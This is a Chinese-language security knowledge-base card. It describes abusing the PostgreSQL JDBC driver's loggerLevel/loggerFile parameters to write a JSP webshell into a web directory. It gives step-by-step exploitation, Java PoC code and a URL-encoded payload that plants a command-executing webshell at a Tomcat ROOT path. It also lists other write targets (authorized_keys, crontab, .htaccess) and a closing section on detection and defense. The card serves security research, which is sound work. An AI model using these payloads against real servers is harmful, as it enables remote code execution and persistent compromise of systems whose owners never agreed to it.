---
id: web-java-component-pgjdbc-loggerfile-jsp-webshell-file-write
title: PostgreSQL JDBC 的 loggerLevel/loggerFile 当任意文件写用：把 JSP 代码塞进 URL，靠 = 截断让驱动把 shell 写进 Web 目录
type: scenario
domain: web
path: web/java/component
technique: pgjdbc-loggerfile-arbitrary-file-write-webshell
tags:
- java
- jdbc
- postgresql
- file-write
- webshell
- driver
- loggerfile
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:57:59+08:00'
  notes: 已对照原文核对；本次核对未读取图片；payload jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&loggerFile=shell.jsp&<%Runtime.getRuntime().exec("calc")};%> =\n 与卡内 PoC 一致，正文自述在 pgjdbc 42.3.0 环境复现「写文件成功」但未给 JSP 执行回显；原文未给出该写文件原语的受影响版本区间，42.3.0 仅为复现版本，故未设 versions；已修正卡内一处乱码字符；PoC 未对真实目标执行
url: /docs/web/java/component/web-java-component-pgjdbc-loggerfile-jsp-webshell-file-write/
draft: false
kb_aliases:
- pgjdbc loggerFile 写文件
- loggerLevel DEBUG 落盘
- JDBC URL 写 WebShell
- PostgreSQL 驱动日志文件写马
- URL 里 = 截断绕过 URLDecoder
---

## 一句话结论

可控 JDBC URL 不必走到反序列化或类加载也能拿 shell：pgjdbc 的 `loggerLevel=DEBUG` + `loggerFile=<路径>` 会在建立连接时打开该文件并写入调试日志，而日志内容里就包含完整 JDBC URL。于是把 `<%Runtime.getRuntime().exec("calc")%>` 之类的脚本片段直接拼在 URL 尾部的参数值里，再把 `loggerFile` 指向 Web 目录下的 `.jsp`，驱动就替你完成“任意文件写 + 落 WebShell”；URL 中 `=` 之后的片段会截断掉前面的内容，既避免破坏 `loggerFile` 的解析，也让落盘的脚本片段更干净。

## 原理

- **日志是可控内容的“写文件原语”**：pgjdbc 在 DEBUG 级别会把连接串、握手细节写进 `loggerFile` 指定的文件（`org.postgresql.Driver` 内部使用 `java.util.logging`）。文件路径、内容（URL 本身）都由攻击者决定，等价于任意路径任意内容写入（受进程权限限制）。
- **`=` 截断技巧**：把脚本片段放在 `loggerLevel`/`loggerFile` 之后的参数里，并在片段前用 `=` 起头（原文 `...=<%Runtime...%> =\n`），先让 pgjdbc 把 `=` 前的部分当作合法查询参数解析掉，剩下的 `<%...%>` 只是 URL 里的“垃圾值”，但会原样出现在日志里；这样既不影响连接参数解析，又能让落盘内容相对干净。
- **为什么能当 WebShell**：写入位置在 Web 目录、后缀为 `.jsp` 时，容器会把它当 JSP 编译执行；日志前缀（时间戳、类名）通常落在 JSP 代码之外，可以作为“垃圾字符”被 JSP 引擎忽略或在行内用 `<%-- --%>` 之类包裹。
- **与 JAR/socketFactory 链的区别**：那条链是“先写文件再加载类”，需要 classpath 有 Spring、需要构造可用 JAR；本卡是**单步**写文件，只要目录可写、后缀可执行即可，门槛低得多，但依赖目标存在可写且可访问的 Web 路径。

## 触发条件

- 应用允许用户控制 JDBC URL（数据源测试、连接配置、报表/ETL 参数、H2 Console 等），且驱动为 PostgreSQL（`org.postgresql.Driver`）。
- 目标驱动版本支持 `loggerLevel`/`loggerFile` 属性（pgjdbc 一直支持；部分加固版本会禁用）。
- 进程对目标路径有写权限，Web 服务能访问该路径且把 `.jsp`/`.php` 当脚本解析。
- 连接会真正发起（host 可达或本机有监听，用于触发日志初始化）。

## 利用步骤

1. 确认 URL 可控并知道 Web 根目录（通过报错、目录扫描、已知部署结构或 `webroot` 泄露接口）。
2. 构造 URL：`jdbc:postgresql://<host>:<port>/test/?loggerLevel=DEBUG&loggerFile=<webroot>/shell.jsp&<脚本片段> =\n`。
3. 让应用用该 URL 建连；驱动初始化日志并写入文件，URL（含脚本片段）落盘。
4. 访问 `http://target/shell.jsp`，若被日志前缀破坏则调整片段位置（把脚本放在参数值的最前面、或用多次写入覆盖）。
5. 若 `.jsp` 不可解析，改写成 `.php`、`.asp`、`.aspx`，或写入 `.htaccess`/`web.config`、计划任务文件、SSH `authorized_keys`（写文件原语不限 Web）��

## PoC

```java
// 原文形态：URL 尾部夹带脚本片段，loggerFile 指向 Web 目录
String URL = "jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&loggerFile=shell.jsp"
           + "&<%Runtime.getRuntime().exec(\"calc\")};%> =\n";
DriverManager.registerDriver(new org.postgresql.Driver());
DriverManager.getConnection(URL).close();
```

```text
# 直接放进 curl/接口参数时做一次 URL 编码，保留 & 与 = 的分界
jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&loggerFile=/usr/local/tomcat/webapps/ROOT/s.jsp&<%25%3dRuntime.getRuntime().exec(request.getParameter("c"))%3b%25>%20%3d%0a
```

说明：原文在本地 pgjdbc 42.3.0 环境复现了“写文件成功”，未给出 JSP 落地后执行的回显；`shell.jsp` 为可写 Web 目录下的相对路径，实际需按部署结构写绝对路径。

## 变体与关联

- **同驱动其它写文件参数**：`loggerFile` 之外，pgjdbc 的 `sslrootcert`/`sslcert` 只是读取；写面主要是日志；MySQL 驱动的 `logger` 参数（`com.mysql.cj.log.StandardLogger` + `logFile`）同理可写文件。
- **组合链**：用本卡先写 ASCII-only JAR 或 Spring XML，再用 `socketFactory=ClassPathXmlApplicationContext` 加载（见关联卡），可从“写文件”升级为“加载执行”；也可写 Tomcat `work` 目录下的 `.tmp` 供通配符加载。
- **写文件目标变体**：`authorized_keys`、`crontab`、`~/.bashrc`、Windows 启动目录、`web.config`（IIS 允许脚本映射）、`.htaccess`（AddType 让任意后缀按 PHP 解析）。
- **关联**：`web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce`（同一 `loggerFile` 原语用于写 JAR + socketFactory 加载）、`web-java-component-pgjdbc-cve-2022-21724-socketfactory-spring-xml-rce`（同驱动的类加载面）、`web-java-component-kingbase8-jdbc-configurepath-tempfile-spring-xml-rce`（同族“驱动读/写本地文件”）。
- **边界**：驱动/容器禁用 `loggerLevel`/`loggerFile`、目录不可写、Web 目录禁止脚本解析、路径被白名单限制时失效；部分版本把日志改成只写 stderr。

## 检测与防御

- **JDBC 参数收口**：禁止客户端设置 `loggerLevel`、`loggerFile`、`socketFactory`、`socketFactoryArg`、`autoDeserialize` 等“驱动行为参数”；只允许 host/port/db/账号等白名单键。
- **文件系统**：Web 目录对应用进程只读（或只允许写特定 uploads 且禁止脚本解析）；日志目录与 Web 目录分离。
- **容器**：禁止在 Web 目录解析任意脚本；上传目录用独立域名/`Content-Disposition: attachment` 下发。
- **检测**：JDBC URL 中出现 `loggerLevel=DEBUG`、`loggerFile=`、`.jsp`/`.php` 后缀、URL 尾部出现 `<%`/`<?php`/`Runtime`；Web 目录新增 `.jsp` 且内容含 JDBC 连接串片段；Java 进程打开 Web 目录下的新文件并写入。
